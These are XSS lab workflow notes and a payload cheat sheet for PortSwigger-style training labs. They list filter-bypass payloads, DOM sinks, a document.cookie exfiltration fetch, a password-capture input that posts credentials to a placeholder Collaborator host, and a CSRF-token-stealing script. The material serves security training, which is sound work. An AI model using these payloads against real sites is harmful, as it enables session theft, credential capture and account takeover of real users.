Workflow notes

Search bar

  1. Submit a unique marker, such as MARKER731, and locate it in the request, response, and live DOM.
  2. Trace the value to its sink. Decide whether it is reflected by the server or inserted by client-side JavaScript.
  3. Identify the exact context: HTML text, attribute, JavaScript string, URL, or DOM API.
  4. Change one delimiter at a time; compare what you sent with the response and DOM to map encoding, escaping, and filtering.
  5. Prove execution with a harmless effect before adapting the payload to the authorized lab objective.

Comment section

  1. Check whether comments are stored, moderated, or reflected only in the immediate response.
  2. Submit a harmless marker and inspect how it is rendered on a fresh page load and, where relevant, in another user’s view.
  3. Map server-side cleanup and client-side transformations separately. A stored value may reach different sinks in different views.
  4. In the local exercise, submit the payload first, then send the stored-comments page to the local bot.

Cookie: HttpOnly not set

If a session cookie is not marked HttpOnly, JavaScript running in that origin can usually read it through document.cookie. That makes direct cookie access possible, but whether it is the right objective depends on the lab. Cookies marked HttpOnly are omitted from document.cookie; XSS may still be able to perform actions as the user through same-origin requests.

Custom tags focus event

When standard tags are blocked, check whether a custom element name is accepted. It may need to be made focusable and focused by the victim flow.

<xss id=x onfocus=alert(document.cookie) tabindex=1>#x

The fragment can target the element when the link is opened. Verify whether the page or the lab’s delivery flow actually gives it focus.

With most tags and attributes blocked

  1. Identify which tags are allowed. In Repeater, right-click the parameter and choose Scan insertion point. Use the scan to identify candidate tags and events.
  2. Review the scanner result, then verify the surviving attribute or event handler in the response and browser.
  3. Check whether a different harmless proof such as print() is useful when a lab’s detection or WAF behavior treats dialogs specially.
<body onresize=print() tabindex=1>

For a victim-triggered resize in a controlled PortSwigger lab, the exploit page can embed the target in an iframe and resize it after load.

Event handlers and href blocked

If direct event handlers and javascript: URLs are filtered, investigate SVG elements that can change an anchor’s href value through animation.

<svg><a><animate attributeName=href values="javascript:print()" /><text x=20 y=20>Click me</text></a></svg>

Whether this executes may depend on browser behavior and user interaction. Test in the exact lab browser.

SVG markup allowed

  1. Check which SVG elements survive, for example svg, animateTransform, title, or image.
  2. Use the insertion-point scanner to find event attributes the filter does not remove.
  3. Consider events tied to the element lifecycle, such as an animation’s onbegin.
<svg><animatetransform attributeName=transform type=translate from="0 0" to="1 1" dur="1s" onbegin=print()>

Encoding and JavaScript contexts

Angle brackets encoded

If the value is inside an existing element’s attribute, you may be able to add an event handler by closing the quoted value. First inspect the exact quote style and whether whitespace or the event name is filtered.

" onmouseover="print()

Quotes HTML-encoded in an href

When the injected value remains inside an href, test URL schemes only in the authorized lab and check how the browser interprets the final attribute.

javascript:print()

Single quote is backslash-escaped in a JavaScript string

Escaping a quote can be bypassable when existing backslashes are not normalized. Compare each transformation carefully; the number of backslashes changes how the JavaScript parser reads the quote.

</script><script>print()</script>

Input:  ';print(document.domain)//
After:  \';print(document.domain)//
Alternative input:  \';print(document.domain)//
After:  \\';print(document.domain)//

Breaking out of a JavaScript string

'-print(document.domain)-'
';print(document.domain)//
'-print(1)-'
\'-print(1)//

HTML entities in an attribute

Entities such as &apos; may be decoded by the HTML parser before the resulting value is interpreted. Check the context and parsing order.

&apos;-print(1)-&apos;
http://foo?&apos;-alert(1)-&apos;

Template literal with characters Unicode-escaped

${print(1)}

jQuery location.hash

Trace the URL fragment into the jQuery or DOM operation. Fragments are not sent in the HTTP request, so inspect client-side code and the live DOM.

Payload:
#" onload="this.src+='<img src=x onerror=print()>'"

Alternative fragment test:
#<img src=x onerror=print()>

For a controlled lab, an exploit page may embed the target in an iframe and adjust the frame URL after load:

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

DOM XSS using web messages and a JavaScript URL

When a message listener passes attacker-controlled data into a navigation or URL sink, determine whether it validates the scheme and origin.

window.postMessage('javascript:print()//http:', '*');

Example delivery pattern for an authorized lab:

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:', '*')"></iframe>

A wildcard target origin is shown because it appears in the lab technique; production message handlers should validate the sender origin and message schema.

DOM sinks to recognize

  • document.write() and document.writeln()
  • innerHTML, outerHTML, and insertAdjacentHTML()
  • HTML attribute assignment and event-handler properties
  • eval(), Function(), and string-based timers
  • Navigation or resource sinks such as location, src, and href
  • Framework-specific expression or template evaluation

A source is not vulnerable by itself. Confirm that attacker-controlled data reaches a dangerous sink in an executable context without a safe transformation.

Cookie access in an authorized lab

  1. Find a vulnerable feature and identify where the victim will view the injected content.
  2. First prove execution with a harmless action.
  3. In a PortSwigger lab, send only the lab’s required test cookie to its own exploit server or a Collaborator instance you control.
  4. For this local demo, use its local /collect receiver and fake training cookie.
fetch('/collect?c='+encodeURIComponent(document.cookie))

For a PortSwigger lab, replace the local receiver with the lab’s own exploit server endpoint; do not use real accounts or third-party targets.

Password capture lab

Some training labs ask you to demonstrate credential capture using a deliberately vulnerable comment or page. Keep this strictly inside that lab and use only the supplied test account. Do not deploy credential collection against real users.

<input name=username id=username>
<input type=password name=password
  onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
    method:'POST',mode:'no-cors',body:username.value+':'+this.value
  })">

Use a Collaborator hostname generated for your own authorized exercise. The hostname above is a placeholder and does not receive data.

Using XSS to perform a CSRF-protected action

Same-origin XSS can often read a CSRF token from the victim’s page and submit a state-changing request in that victim’s session. Use only the designated lab account and endpoint.

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get', '/my-account', true);
req.send();
function handleResponse() {
  var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
  var changeReq = new XMLHttpRequest();
  changeReq.open('post', '/my-account/change-email', true);
  changeReq.send('csrf=' + token + '&email=student@example.invalid');
}
</script>

Encoding a payload for a filter

Base64 can change the characters visible to a naive filter when the page later decodes and evaluates the value. It does not make unsafe evaluation safe; treat this as a lab-specific bypass.

printf %s "print(document.domain)" | base64

// In the authorized lab, if the relevant sink evaluates the decoded text:
eval(atob("BASE64-PAYLOAD"))
